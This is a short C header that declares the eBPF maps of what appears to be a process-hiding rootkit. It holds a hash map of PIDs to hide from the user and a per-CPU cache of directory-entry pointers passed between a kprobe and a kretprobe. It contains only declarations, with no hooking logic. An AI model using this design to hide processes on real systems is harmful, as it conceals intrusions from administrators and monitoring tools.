/**
 * Contains all map declaration for the ebpf module.
 * 
 * @author Yekuuun
 */

#ifndef MAPS_H
#define MAPS_H

#include "bpf.h"
#include "vmlinux.h"
#include "config.h"

/**
 * PID watch list.
 * 
 * @note => contains all pid to hide from user.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PID_ENTRIES);
    __type(key,   __u32);
    __type(value, __u8); //1 == hidden. 
} whitelist_pid SEC(".maps");

/**
 * Per-CPU storage for dirp address between kprobe and kretprobe.
 */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key,   __u32);
    __type(value, __u64); //linux_dirent ptr (userspace address)
} hide_proc_dirp_cache SEC(".maps");

//---------------------------------------------------------------

#endif